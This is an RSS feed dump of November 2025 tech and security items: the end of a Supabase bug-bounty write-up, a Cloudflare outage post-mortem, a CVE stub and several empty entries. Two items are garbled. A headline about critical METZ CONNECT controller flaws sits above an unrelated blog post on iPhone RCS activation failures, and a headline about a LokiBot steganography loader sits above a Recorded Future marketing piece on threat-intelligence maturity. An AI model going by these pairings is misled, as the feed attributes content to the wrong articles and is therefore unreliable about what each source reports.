Slack connectSupabase team acknowledged the severity of the issue and asked us to not try anything further.Orchestration systems API no longer accessible via hosts.Further postgres image hardening and Supautils fixes.Supabase awarded us with  bounty.Conclusion and Key TakeawaysThis research highlights how a single, subtle bug in a core component can be chained with other misconfigurations, such as an SUID binary and cloud misconfiguration, to dismantle the security boundaries of a multi-tenant cloud environment.It’s important to again note that this vulnerability chain only affected a very small number of instances on a deprecated infrastructure version that was already scheduled for upgrade. Supabase’s modern infrastructure was not vulnerable to this attack chain, and the affected instances were quickly secured.: While each individual vulnerability might seem minor, chaining them together had a significant impact. This demonstrates why layered security is crucial.Responsible Disclosure Works: The rapid response from Supabase, patches within 24 hours, shows the value of collaborative security research and responsible disclosure.The Power of AI-Accelerated Research: Crucially, AI-driven automation dramatically accelerated the discovery and validation process. Rather than replacing human judgment, AI multiplied it: automating hypothesis validation, surfacing likely attack paths from noisy reconnaissance dump, and speeding exploit generation tasks so the research team could iterate far faster than by manual hunting alone. That velocity cut days of manual reconnaissance down to hours, letting the team confirm impact and coordinate a fix before the window widened. The goal now is to democratize the same speed to everyone. Hacktron wants to bring this level of automated, AI-assisted detection and validation into security teams’ toolkits, so defenders can find and remediate complex chained issues before attackers can stitch them together. Moving these capabilities into continuous testing, post-deployment validation, and incident playbooks will help reduce time-to-detect and time-to-fix, and narrow the window of opportunity for real-world abuse.Book a call with us at hacktron.ai if you’d like to learn more about our research and how we can help you find and fix vulnerabilities in your software.]]></content:encoded></item><item><title>Critical METZ CONNECT Flaws (CVSS 9.8) Allow Unauthenticated RCE and Admin Takeover on Industrial Controllers</title><link>https://securityonline.info/critical-metz-connect-flaws-cvss-9-8-allow-unauthenticated-rce-and-admin-takeover-on-industrial-controllers/</link><author></author><category>security</category><pubDate>Wed, 19 Nov 2025 02:43:43 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Apple blames the carriers, the carriers tell me it’s not them (mostly T-Mobile since I have good contacts there). They tell me they can’t really do anything about iPhones not working on RCS, go back to Apple. This is what it looks like: In short, it’s probably Apple or Google and there’s zero accountability from Apple. I have AppleCare+ and really hoped they’d actually try to troubleshoot and fix this rather than waste my time working around it (in a stupidly expensive way for me and Apple).I’m OS agnostic as much as possible, I daily both Android and iOS devices and previously used BlackBerry 10 and Harmattan (Nokia N9’s OS). If Windows Phone was still around I’d probably still be running that as well. If it’s possible to gather information on how all this works under the hood, I can and do. The OnePlus Android devices I’m running are my own LineageOS builds. Previous history fixing MMS failures for Carriers/Vendors #In short: When you received a picture message on Verizon in the past their network would notify your device that a new message arrived. When the device went to grab and download the image, it sends something similar to browser User Agent, called a UAProf. This is a link to a file that describes what the phone can handle, so a smartphone gets a high resolution image and a featurephone gets a lower resolution one. Verizon’s management sucks and decommissioned the domain that hosts all the UAProfs for their devices. Of note, Verizon is uniquely affected by this issue, T-Mobile doesn’t care what UAProf a device advertises, it’s not required on their network. I haven’t done enough testing with AT&T to answer whether it’s an issue for them.MMS Failure Demonstrations #Notice it doesn’t load? Apple/Blackberry and basically any non-Android manufacturers didn’t trust carriers to host these files. Some manager at Verizon decided to kill the vtext service and also fucked over any MMS users on their network not using an iPhone.I’m getting off-topic though, I just wanted to post some context that this is not my first rodeo with fixing these kinds of issues. Carriers are incompetent with this sort of interoperability and they gave up on running their own RCS servers to let Google do it through something called Google Jibe, I’ll talk about that soon.Starting around the end of 2023, Google started to maliciously break RCS for custom Android OS’s. I say maliciously because it was a silent failure, RCS reported as working, but messages wouldn’t go through, and incoming messages would fail to receive. Google could have remained silent about it and rumors probably would have swirled: Perhaps it was a technical issue or the custom ROM developers’ faults? No, Google  broke it.Eventually for my own devices I would spoof to the fingerprint of Google PIxel devices to be able to use RCS. It has mostly continued to work since then, but it begs the question: If I could reliably work around the blocking, then what excuse do you have about it being to prevent spam? Since those spammers will just use the same methods I’ve used, which are hardly secret. It just aims to hurt users that want some control of their device.At some point Apple was dragged kicking and screaming into RCS interoperability. I actually have some sympathy here because MMS was really a terrible protocol that nobody should have adopted and Apple was dragged into supporting that years after the original iPhone launch in iOS 3. Regardless, with iOS 18, Apple brought in baseline RCS (version 2.4) support. It is hoped that they will update it sometime in the iOS 26 series to include E2E encryption.RCS always worked on my phone in iOS 18 until the past month when I upgraded to iOS 26. I should note that unlike Android, I do not modify iOS device in any way, basically I expect it should ‘just work’. The only unusual thing I run is Mullvad’s DNS to act as an adblocker, but so does my family and their iDevices don’t have RCS issues. I am a dual-sim user on T-Mobile and US Mobile (usually on the AT&T network). With iOS 26 both lines have been stuck on “Waiting for activation…”. If I transfer the lines off to any other iPhone, the lines activate in seconds. I additionally took a Verizon Wireless line from my Mom’s 14 Pro Max and it also displayed the same issue. My girlfriend has a 14 Pro Max and a SE3, both can activate my RCS lines when I transfer them over.I’ve done an absolutely exhaustive level of testing to see if these lines would activate on my phone, there’s probably more than this but this is what I could think of:Rebooted/Toggled Airplane Mode/Toggled RCSResetting Network SettingsRemoved all my VPN profiles and apps. (Mullvad/Orbot/Mullvad’s DNS profile/my server’s wireguard profile)Deactivated one of my lines and tried reactivating RCS.Disabling 5G and trying to activate RCS. Reissuing both eSIM’s from the carriers.Resetting All settings
9 Resetting everything on device.

Restoring from iTunes backupRestoring from iCloud backup (literally activated a trial to be able to do this)Tested resetting with and without eSIM.Recovering device (recovery mode, setting up as new device) 

Both with and without eSIM’s on device.Disabling RCS and waiting  before attempting to reactivate.Updating my e911 addresses, disabling/renabling wifi calling. Testing on Wifi.Reissuing just T-Mobile eSIM but to the other IMEI on the phone that it’s normally not on. Deleting the numbers out numerous times in Carrier settings (I have no idea what this does but it does make the signal reconnect). Testing sending messages from devices that work with RCS to this device in hopes it upgrades.Testing the iOS beta releases. I brought up the Gentoo Linux packages for libimobiledevice so I could run idevicesyslog and dump hundreds of megabytes of live logs in hopes of being able to see what the phone is failing on: (the packages) https://github.com/joecool1029/joecool-overlay/tree/master/app-pdaThis is a small T-Mobile related excerpt of what looks like the problem could be. Specifically, UserInteractionRequired.xml. I don’t know what interaction is needed and why Apple’s software isn’t presenting more information, but this is the best I could do from digging through a ton of redacted logs:

So this last entry probably tells us where to look. The carrier (T-Mobile here) is provisioned for RCS, it’s receiving this interaction required file with infinite validity. So long as that’s in place, it fails to activate. (This is a guess, but it’s certainly more information than the KB articles give on Apple’s sites).Apple does not provide their employees with correct information on troubleshooting this issue. They do not empower them to properly troubleshoot the issue. #The standard instruction given to them is: “Do not take accountability, blame the carrier.”So then I come in and say I have failures with all 3 major carriers and categorically refuse to accept that explanation, when I know my lines work just fine on other iDevices.The Apple Store initially blamed software, this would be reasonable except we’ve reloaded the state of my phone 3 times now (once from iTunes, and twice now from iCloud, tomorrow will be the 4th time). I gave them permission to wipe any setting and recover the phone, but I go a step further and request they transfer my T-Mobile eSIM to another store device preferably in the 15 Pro line. They cannot do this because of user privacy reasons. This is a dealbreaker from troubleshooting, I am not made of money and I do not have any additional 15 pro devices to test with, it’s already crazy enough I have multiple carriers at the ready to test, 2 14 Pro Max’s and a SE3. I think this is where we need information. As I said before, the carriers in the US gave up running their own RCS infrastructure and Apple’s employees aren’t really trained about this situation. With the exception of my own knowledge and the logs I pulled from the phone, Jibe was not mentioned once in the 3 phone calls and the multiple hours onsite in Apple Store today.I have no business relationship with Google Jibe, and there’s no way for me to interact with or contact them. Their documentation is probably here but I can’t read it, since I’m not a carrier partner: https://docs.jibemobile.com/ Apple knows there’s a ‘carrier’ issue, but in reality, RCS is run through Google Jibe in the US and this was never once disclosed to me. I never brought it up until this blog post, I cannot go into a store and say “I have been using opensource tools to analyze the logs from this phone and think it’s a failure with Jibe”. Do you get how crazy this sounds? Since they hit a wall and I refuse to continue to entertain the “go bug T-Mobile/US Mobile” direction, Apple is swapping the board in my phone. Of course they didn’t have the parts in the store to do it, so I have to wait to drive back tomorrow for them to do it. This will have new IMEI numbers and given the experience I’ve had with these lines activating on 3 other iDevices, it should probably work. The only way it wouldn’t is if this was a generational issue, but they have not given me a way to test this. They adamantly tell me: “We are doing you the favor as a courtesy, we don’t believe this is our problem.” I know they are trained to say this but it’s terrible customer service. I shelled out for Applecare+, if it might be the phone just swap it and analyze it back at Apple HQ, I’ve done enough testing now to know it’s something with just this specific device. I referred people to use iPhones because in general they do not often have these issues and the customer support was good. The board swap solution they are offering only wastes my time/fuel and punts the problem down the road. Since we never actually looked at the logs I might hit it again, other users might be affected.I use opensource software not because it’s inherently better, but rather because I can at least triage, understand, and fix problems.  I’m a rare dual-SIM user in the US with a Google Jibe RCS failure. Where did it fail? Dig into my logs and tell me: Is it because I hop between primary data carriers (because the whole reason I have dual-carrier is better service coverage). I don’t spend a lot of time on WiFI, I run my house on mobile carriers. The only thing I know is I didn’t change my configuration from iOS 18 to iOS 26, but things stopped working and there’s no way for me to downgrade to 18 because you stopped signing it!]]></content:encoded></item><item><title>I analyzed Python packages that can be abused to build surveillance tools — here’s what I found</title><link>https://audits.blockhacks.io/audit/python-packages-to-create-spy-program</link><author>/u/kryakrya_it</author><category>netsec</category><pubDate>Wed, 19 Nov 2025 00:26:42 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Show HN: I made a down detector for down detector</title><link>https://downdetectorsdowndetector.com/</link><author>gusowen</author><category>dev</category><pubDate>Wed, 19 Nov 2025 00:05:28 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Stealth Stealer: New .NET Loader Hides LokiBot Payload in BMP/PNG Images Using Advanced Steganography</title><link>https://securityonline.info/stealth-stealer-new-net-loader-hides-lokibot-payload-in-bmp-png-images-using-advanced-steganography/</link><author></author><category>security</category><pubDate>Wed, 19 Nov 2025 00:05:11 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Under this deluge of data, many organizations find themselves struggling to actually make sense of, let alone use of, all this information.Recorded Future offers a concrete threat intelligence maturity journey organizations can follow in order to evolve from this reactive state of intelligence overload, to a more value-added state. The four stages of this journey include: Reactive, Proactive, Predictive, and Autonomous.Along the course of this journey, organizations will take clear steps to go from responding to threats after detection, to preventing known threats, all the way to using automation to self-direct threat responses with minimal human interventionPlatforms like Recorded Future provide the data, context, and automation to accelerate your journey toward operational cyber threat intelligence maturity.The Information Overload Problem: Why More isn’t Always BetterYour security operations center (SOC) runs multiple threat intelligence feeds around the clock. Hundreds of alerts pour in daily—indicators of compromise (IOCs), suspicious IP addresses, emerging vulnerabilities, and more. Yet despite all this data, the team still spends much of its day reacting to alerts, rather than staying ahead of threats. Valuable data is stored, analyzed, and even given high visibility, but rarely acted upon in time to make a difference.This is the information overload problem, and it’s widening the gap between information and action. Organizations collect and subscribe to vast quantities of threat data from multiple sources, but few have the threat intelligence capabilities—the processes, integrations, and automation—required to add context to all that data and transform it into measurable security outcomes.The problem isn’t the data itself. It’s the operationalization of it. That is to say, the ability to use threat data efficiently, contextually, and predictively across the security ecosystem. As Recorded Future highlights in its , most organizations are somewhere along a journey toward maturity, moving from purely reactive intelligence to fully autonomous operations.This post explores that path, offering a practical roadmap for transforming raw alerts into operational cyber threat intelligence. Using the four stages of maturity (i.e. Reactive, Proactive, Predictive, and Autonomous) we’ll show how organizations can evolve their security programs from putting out fires to acting with foresight.The Threat Intelligence Maturity Model: From Reactive to AutonomousThreat intelligence isn’t a binary capability. It exists on a continuum. As organizations gain visibility, automation, and analytical depth, their approach to threat intelligence evolves. Recorded Future’s  defines this journey in four stages:: Responding to threats after detection.: Preventing known threats before impact.: Anticipating threats before they materialize.: Enabling self-directing, intelligence-led defense at machine speed.Each stage represents a significant leap in capability, mindset, and operational efficiency. Progress along this path requires more than just technology. It depends equally on people, processes, and the integration of intelligence into everyday decision-making.In the sections that follow, we’ll explore what defines each stage, common challenges, measurable KPIs, and key actions to help organizations advance their threat intelligence operations.Stage 1: Reactive—Responding to What’s Already HappenedThis stage is typical for teams suffering from alert fatigue or lacking dedicated threat intelligence personnel. Intelligence feeds may be connected to security tools, but without clear processes, much of that data sits unutilized.Characteristics of a Reactive OrganizationFocused on detection and containment.Success means closing incidents, not necessarily preventing them.However, this stage is where the foundation for maturity is built.Pain Points and ChallengesOverload without insight: Teams receive too many alerts to analyze effectively.Siloed tools and workflows: Intelligence isn’t integrated across the stack.Limited automation: Manual lookups and enrichment dominate response time.High dwell time: Threats are detected after the fact, often too late for meaningful containment.Centralize intelligence feeds into a single operational view.Automate enrichment of alerts with high-confidence threat indicators.Establish workflows for classifying, triaging, and escalating alerts based on context.Begin correlating IOCs with known campaigns or adversary tactics.Success Indicators and KPIsAcross the industry, certain standards, KPIs and other measures have emerged to help orient and assess one’s progress through each stage of the maturity journey. For the Reactive stage, these include:Reduction in duplicate or “known bad” alerts.Decrease in manual investigations per analyst.Improved Mean Time to Triage (MTTT): faster analysis of known threats.Greater integration between intelligence feeds and alert management.The Reactive stage is about laying the groundwork for operationalized intelligence, consolidating data and reducing noise so analysts can focus on meaningful threats. Once teams can respond consistently and efficiently, they’re ready to evolve toward a proactive posture.Stage 2: Proactive—Preventing Known ThreatsThe Proactive stage marks a crucial transition from reacting to known events to actively preventing them. Here, organizations begin to enrich alerts with context, prioritize risk, and use intelligence to inform vulnerability management and threat hunting.Teams at this stage have moved beyond basic detection. They use intelligence to drive decision-making, asking “What matters most to us?” instead of simply responding to what the feeds say.Characteristics of a Proactive OrganizationSecurity teams conduct regular threat hunting exercises to identify indicators of compromise before alerts fire.Vulnerability management programs are intelligence-led, prioritizing patches based on real-world exploitation trends.Analysts can articulate threat actor behaviors and motivations, not just indicators.Intelligence is beginning to inform executive-level reporting and risk assessments.Pain Points and ChallengesContext overload: Adding intelligence without prioritization can still create noise.Scaling analysis: Manual research can’t keep up with threat volume.Communication gaps: Intelligence insights may not reach decision-makers fast enough.Integrate enrichment and context directly into alert workflows.Use intelligence to prioritize vulnerabilities being actively exploited in the wild.Establish a repeatable threat hunting process tied to known tactics, techniques and procedures (TTPs).Create basic reporting dashboards to show intelligence-driven outcomes to leadership.Success Indicators and KPIsAs outlined above, industry best practices and our own internal expertise has helped to inform clear indicators of success and measurable KPIs to help you traverse this stage:Further reduction in Mean Time to Respond (MTTR) and faster full-cycle incident resolution.Increase in incidents identified through proactive hunting.Decrease in unpatched, high-risk vulnerabilities.More consistent cross-departmental sharing of intelligence insights.Proactive organizations are no longer purely reactive responders; they are early detectors. They use operational cyber threat intelligence to stop known attacks before they strike, ridging the gap between detection and prevention.Stage 3: Predictive—Anticipating What’s NextAt the Predictive stage, organizations transform from defenders into forecasters. Intelligence isn’t just about identifying active threats. It’s about anticipating what adversaries will do next.Predictive intelligence uses advanced analytics, automation, and pattern recognition to reveal emerging campaigns, shifting tactics, and vulnerabilities before they’re exploited. At this stage, intelligence becomes strategic, influencing not just SOC operations but enterprise-wide risk management and planning.Characteristics of a Predictive OrganizationSecurity and risk teams share a unified intelligence strategy.Machine learning and AI tools help identify evolving threat trends.Insights extend beyond cyber to supply chain, digital risk, and geopolitical factors.The organization uses predictive intelligence to guide security investment decisions.Pain Points and ChallengesData interpretation: Turning predictive signals into actionable decisions.Cross-functional alignment: Intelligence must inform departments beyond security (legal, procurement, communications).Maintaining analyst trust in automation, ensuring predictive systems remain transparent and explainable.Combine internal telemetry with external intelligence for a 360° threat view.Monitor emerging TTPs and map them to organizational exposures.Develop scenario-based playbooks informed by predictive analysis.Use predictive insights to shape security budgets and executive strategy.Success Indicators and KPIsSignificant reduction in average dwell time (threats neutralized before causing damage).Overall percentage of threats mitigated before exploitation.Increased accuracy of threat forecasting.Improved strategic alignment between security and business objectives.The Predictive stage represents the maturation of threat intelligence operations. Security becomes a forward-looking function—one that can anticipate risk and shape outcomes, rather than merely react and respond to them.Stage 4: Autonomous—Intelligence at Machine SpeedThe Autonomous stage represents the pinnacle of operational cyber threat intelligence maturity. At this point, intelligence systems and AI-driven automation operate continuously: detecting, analyzing, and responding to threats with minimal human intervention.Here, human analysts focus on strategic research, oversight, and long-term planning while machines handle routine detection and response. Intelligence is fully operationalized, driving every aspect of the security ecosystem in real time.Characteristics of an Autonomous OrganizationThreat intelligence is deeply integrated across all systems and workflows.AI and automation enable continuous detection and response without manual triggers.The organization has global visibility into digital, third-party, and geopolitical risks.Threat intelligence is recognized as a strategic business differentiator.Pain Points and ChallengesGovernance and oversight: Ensuring automated decisions remain transparent and aligned with policy.Cultural adaptation: Building trust in autonomous operations among leadership and analysts.Optimization: Continuously tuning models and workflows for performance and precision.Expand autonomous intelligence integration across the full security stack.Enable continuous enrichment of intelligence data for context-aware decision-making.Automate rule creation and response playbooks based on live threat insights.Use AI to generate executive-level summaries and automated intelligence reporting.Success Indicators and KPIsHigh rate of automated response actions.Continuous reduction in dwell time.Consistent threat mitigation without human escalation.Cross-functional visibility and reporting of intelligence outcomes.In the Autonomous stage, the line between intelligence and action disappears. Security operations are intelligence-led and self-improving, creating a closed-loop system that operates at the same speed as the adversaries it defends against.Fueling the Engine: How Intelligence Powers Every StageProgression through these maturity stages depends on the quality, breadth, and automation of the underlying intelligence platform. Recorded Future’s ecosystem exemplifies this principle—providing comprehensive data, contextual insights, and machine-speed automation to advance organizations along the maturity curve.Primary Intelligence FocusHigh-confidence indicator feeds (IPs, domains, hashes).Faster triage and response to known threats.Context-rich intelligence: vulnerability data, actor profiles, and exploit trends.Prioritized patching and early threat detection.Strategic insights: TTPs, campaign monitoring, and predictive modeling.Anticipation of future threats and informed investments.Always-on AI-driven analysis and automation.Continuous detection, response, and operational resilience.At every stage, operational cyber threat intelligence is both the fuel and the framework for progress. It informs decisions, shapes response playbooks, and empowers organizations to act faster, smarter, and with greater confidence.Your Next Move on the Journey to Operational Intelligence MaturityOperationalizing threat intelligence is not a single milestone, it’s a journey. Each stage builds upon the last, requiring time, structure, and deliberate investment in people, process, and intelligence integration. Just like a human learning to crawl, walk, run, and sprint, the journey towards maturity is rich with both challenges and rewards.The key is honest assessment:Are you still chasing alerts in a reactive, ad hoc fashion?Have you begun to anticipate known threats through proactive hunting and prioritization?Are you using predictive analytics to anticipate emerging risks?Or have you reached autonomous operations, where intelligence drives decisions at machine speed?Wherever you are today, your next move determines how effectively your organization can predict, prevent, and protect against tomorrow’s threats.Whether you’re integrating your first intelligence feed or orchestrating fully autonomous threat response, Recorded Future provides the data, context, and automation to accelerate your journey toward operational cyber threat intelligence maturity.]]></content:encoded></item><item><title>Cloudflare outage on November 18, 2025 post mortem</title><link>https://blog.cloudflare.com/18-november-2025-outage/</link><author>eastdakota</author><category>dev</category><pubDate>Tue, 18 Nov 2025 23:31:22 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[On 18 November 2025 at 11:20 UTC (all times in this blog are UTC), Cloudflare's network began experiencing significant failures to deliver core network traffic. This showed up to Internet users trying to access our customers' sites as an error page indicating a failure within Cloudflare's network.  The issue was not caused, directly or indirectly, by a cyber attack or malicious activity of any kind. Instead, it was triggered by a change to one of our database systems' permissions which caused the database to output multiple entries into a “feature file” used by our Bot Management system. That feature file, in turn, doubled in size. The larger-than-expected feature file was then propagated to all the machines that make up our network.The software running on these machines to route traffic across our network reads this feature file to keep our Bot Management system up to date with ever changing threats. The software had a limit on the size of the feature file that was below its doubled size. That caused the software to fail.After we initially wrongly suspected the symptoms we were seeing were caused by a hyper-scale DDoS attack, we correctly identified the core issue and were able to stop the propagation of the larger-than-expected feature file and replace it with an earlier version of the file. Core traffic was largely flowing as normal by 14:30. We worked over the next few hours to mitigate increased load on various parts of our network as traffic rushed back online. As of 17:06 all systems at Cloudflare were functioning as normal.We are sorry for the impact to our customers and to the Internet in general. Given Cloudflare's importance in the Internet ecosystem any outage of any of our systems is unacceptable. That there was a period of time where our network was not able to route traffic is deeply painful to every member of our team. We know we let you down today.This post is an in-depth recount of exactly what happened and what systems and processes failed. It is also the beginning, though not the end, of what we plan to do in order to make sure an outage like this will not happen again.The chart below shows the volume of 5xx error HTTP status codes served by the Cloudflare network. Normally this should be very low, and it was right up until the start of the outage. The volume prior to 11:20 is the expected baseline of 5xx errors observed across our network. The spike, and subsequent fluctuations, show our system failing due to loading the incorrect feature file. What’s notable is that our system would then recover for a period. This was very unusual behavior for an internal error.The explanation was that the file was being generated every five minutes by a query running on a ClickHouse database cluster, which was being gradually updated to improve permissions management. Bad data was only generated if the query ran on a part of the cluster which had been updated. As a result, every five minutes there was a chance of either a good or a bad set of configuration files being generated and rapidly propagated across the network.This fluctuation made it unclear what was happening as the entire system would recover and then fail again as sometimes good, sometimes bad configuration files were distributed to our network. Initially, this led us to believe this might be caused by an attack. Eventually, every ClickHouse node was generating the bad configuration file and the fluctuation stabilized in the failing state.Errors continued until the underlying issue was identified and resolved starting at 14:30. We solved the problem by stopping the generation and propagation of the bad feature file and manually inserting a known good file into the feature file distribution queue. And then forcing a restart of our core proxy.The remaining long tail in the chart above is our team restarting remaining services that had entered a bad state, with 5xx error code volume returning to normal at 17:06.The following services were impacted:Core CDN and security servicesHTTP 5xx status codes. The screenshot at the top of this post shows a typical error page delivered to end users.Turnstile failed to load.Workers KV returned a significantly elevated level of HTTP 5xx errors as requests to KV’s “front end” gateway failed due to the core proxy failing.While the dashboard was mostly operational, most users were unable to log in due to Turnstile being unavailable on the login page.While email processing and delivery were unaffected, we observed a temporary loss of access to an IP reputation source which reduced spam-detection accuracy and prevented some new-domain-age detections from triggering, with no critical customer impact observed. We also saw failures in some Auto Move actions; all affected messages have been reviewed and remediated.Authentication failures were widespread for most users, beginning at the start of the incident and continuing until the rollback was initiated at 13:05. Any existing Access sessions were unaffected.All failed authentication attempts resulted in an error page, meaning none of these users ever reached the target application while authentication was failing. Successful logins during this period were correctly logged during this incident. Any Access configuration updates attempted at that time would have either failed outright or propagated very slowly. All configuration updates are now recovered.As well as returning HTTP 5xx errors, we observed significant increases in latency of responses from our CDN during the impact period. This was due to large amounts of CPU being consumed by our debugging and observability systems, which automatically enhance uncaught errors with additional debugging information.How Cloudflare processes requests, and how this went wrong todayEvery request to Cloudflare takes a well-defined path through our network. It could be from a browser loading a webpage, a mobile app calling an API, or automated traffic from another service. These requests first terminate at our HTTP and TLS layer, then flow into our core proxy system (which we call FL for “Frontline”), and finally through Pingora, which performs cache lookups or fetches data from the origin if needed.We previously shared more detail about how the core proxy works . As a request transits the core proxy, we run the various security and performance products available in our network. The proxy applies each customer’s unique configuration and settings, from enforcing WAF rules and DDoS protection to routing traffic to the Developer Platform and R2. It accomplishes this through a set of domain-specific modules that apply the configuration and policy rules to traffic transiting our proxy.One of those modules, Bot Management, was the source of today’s outage. Cloudflare’s  includes, among other systems, a machine learning model that we use to generate bot scores for every request traversing our network. Our customers use bot scores to control which bots are allowed to access their sites — or not.The model takes as input a “feature” configuration file. A feature, in this context, is an individual trait used by the machine learning model to make a prediction about whether the request was automated or not. The feature configuration file is a collection of individual features.This feature file is refreshed every few minutes and published to our entire network and allows us to react to variations in traffic flows across the Internet. It allows us to react to new types of bots and new bot attacks. So it’s critical that it is rolled out frequently and rapidly as bad actors change their tactics quickly.A change in our underlying ClickHouse query behaviour (explained below) that generates this file caused it to have a large number of duplicate “feature” rows. This changed the size of the previously fixed-size feature configuration file, causing the bots module to trigger an error.As a result, HTTP 5xx error codes were returned by the core proxy system that handles traffic processing for our customers, for any traffic that depended on the bots module. This also affected Workers KV and Access, which rely on the core proxy.Unrelated to this incident, we were and are currently migrating our customer traffic to a new version of our proxy service, internally known as . Both versions were affected by the issue, although the impact observed was different.Customers deployed on the new FL2 proxy engine, observed HTTP 5xx errors. Customers on our old proxy engine, known as FL, did not see errors, but bot scores were not generated correctly, resulting in all traffic receiving a bot score of zero. Customers that had rules deployed to block bots would have seen large numbers of false positives. Customers who were not using our bot score in their rules did not see any impact.Throwing us off and making us believe this might have been an attack was another apparent symptom we observed: Cloudflare’s status page went down. The status page is hosted completely off Cloudflare’s infrastructure with no dependencies on Cloudflare. While it turned out to be a coincidence, it led some of the team diagnosing the issue to believe that an attacker may be targeting both our systems as well as our status page. Visitors to the status page at that time were greeted by an error message:In the internal incident chat room, we were concerned that this might be the continuation of the recent spate of high volume :The query behaviour changeI mentioned above that a change in the underlying query behaviour resulted in the feature file containing a large number of duplicate rows. The database system in question uses ClickHouse’s software.For context, it’s helpful to know how ClickHouse distributed queries work. A ClickHouse cluster consists of many shards. To query data from all shards, we have so-called distributed tables (powered by the table engine ) in a database called . The Distributed engine queries underlying tables in a database . The underlying tables are where data is stored on each shard of a ClickHouse cluster.Queries to the distributed tables run through a shared system account. As part of efforts to improve our distributed queries security and reliability, there’s work being done to make them run under the initial user accounts instead.Before today, ClickHouse users would only see the tables in the  database when querying table metadata from ClickHouse system tables such as  or .Since users already have implicit access to underlying tables in , we made a change at 11:05 to make this access explicit, so that users can see the metadata of these tables as well. By making sure that all distributed subqueries can run under the initial user, query limits and access grants can be evaluated in a more fine-grained manner, avoiding one bad subquery from a user affecting others.The change explained above resulted in all users accessing accurate metadata about tables they have access to. Unfortunately, there were assumptions made in the past, that the list of columns returned by a query like this would only include the “” database:SELECT
  name,
  type
FROM system.columns
WHERE
  table = 'http_requests_features'
order by name;Note how the query does not filter for the database name. With us gradually rolling out the explicit grants to users of a given ClickHouse cluster, after the change at 11:05 the query above started returning “duplicates” of columns because those were for underlying tables stored in the r0 database.This, unfortunately, was the type of query that was performed by the Bot Management feature file generation logic to construct each input “feature” for the file mentioned at the beginning of this section. The query above would return a table of columns like the one displayed (simplified example):However, as part of the additional permissions that were granted to the user, the response now contained all the metadata of the  schema effectively more than doubling the rows in the response ultimately affecting the number of rows (i.e. features) in the final file output. Each module running on our proxy service has a number of limits in place to avoid unbounded memory consumption and to preallocate memory as a performance optimization. In this specific instance, the Bot Management system has a limit on the number of machine learning features that can be used at runtime. Currently that limit is set to 200, well above our current use of ~60 features. Again, the limit exists because for performance reasons we preallocate memory for the features.When the bad file with more than 200 features was propagated to our servers, this limit was hit — resulting in the system panicking. The FL2 Rust code that makes the check and was the source of the unhandled error is shown below:This resulted in the following panic which in turn resulted in a 5xx error:thread fl2_worker_thread panicked: called Result::unwrap() on an Err valueOther impact during the incidentOther systems that rely on our core proxy were impacted during the incident. This included Workers KV and Cloudflare Access. The team was able to reduce the impact to these systems at 13:04, when a patch was made to Workers KV to bypass the core proxy. Subsequently, all downstream systems that rely on Workers KV (such as Access itself) observed a reduced error rate. The Cloudflare Dashboard was also impacted due to both Workers KV being used internally and Cloudflare Turnstile being deployed as part of our login flow.Turnstile was impacted by this outage, resulting in customers who did not have an active dashboard session being unable to log in. This showed up as reduced availability during two time periods: from 11:30 to 13:10, and between 14:40 and 15:30, as seen in the graph below.The first period, from 11:30 to 13:10, was due to the impact to Workers KV, which some control plane and dashboard functions rely upon. This was restored at 13:10, when Workers KV bypassed the core proxy system.

The second period of impact to the dashboard occurred after restoring the feature configuration data. A backlog of login attempts began to overwhelm the dashboard. This backlog, in combination with retry attempts, resulted in elevated latency, reducing dashboard availability. Scaling control plane concurrency restored availability at approximately 15:30.Now that our systems are back online and functioning normally, work has already begun on how we will harden them against failures like this in the future. In particular we are:Hardening ingestion of Cloudflare-generated configuration files in the same way we would for user-generated inputEnabling more global kill switches for featuresEliminating the ability for core dumps or other error reports to overwhelm system resourcesReviewing failure modes for error conditions across all core proxy modulesToday was Cloudflare's worst outage . We've had outages that have made our . Some that have caused  to not be available for a period of time. But in the last 6+ years we've not had another outage that has caused the majority of core traffic to stop flowing through our network.An outage like today is unacceptable. We've architected our systems to be highly resilient to failure to ensure traffic will always continue to flow. When we've had outages in the past it's always led to us building new, more resilient systems.On behalf of the entire team at Cloudflare, I would like to apologize for the pain we caused the Internet today. Database access control change deployed.Deployment reaches customer environments, first errors observed on customer HTTP traffic.The team investigated elevated traffic levels and errors to Workers KV service.The initial symptom appeared to be degraded Workers KV response rate causing downstream impact on other Cloudflare services.Mitigations such as traffic manipulation and account limiting were attempted to bring the Workers KV service back to normal operating levels.The first automated test detected the issue at 11:31 and manual investigation started at 11:32. The incident call was created at 11:35.Workers KV and Cloudflare Access bypass implemented — impact reduced.During investigation, we used internal system bypasses for Workers KV and Cloudflare Access so they fell back to a prior version of our core proxy. Although the issue was also present in prior versions of our proxy, the impact was smaller as described below.Work focused on rollback of the Bot Management configuration file to a last-known-good version.We were confident that the Bot Management configuration file was the trigger for the incident. Teams worked on ways to repair the service in multiple workstreams, with the fastest workstream a restore of a previous version of the file.Stopped creation and propagation of new Bot Management configuration files.We identified that the Bot Management module was the source of the 500 errors and that this was caused by a bad configuration file. We stopped automatic deployment of new Bot Management configuration files.Test of new file complete.We observed successful recovery using the old version of the configuration file and then focused on accelerating the fix globally.Main impact resolved. Downstream impacted services started observing reduced errors.A correct Bot Management configuration file was deployed globally and most services started operating correctly.All services resolved. Impact ends.All downstream services restarted and all operations fully restored.]]></content:encoded></item><item><title>CVE-2025-65015 - joserfc has Possible Uncontrolled Resource Consumption Vulnerability Triggered by Logging Arbitrarily Large JWT Token Payloads</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65015</link><author></author><category>vulns</category><pubDate>Tue, 18 Nov 2025 23:15:56 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65015

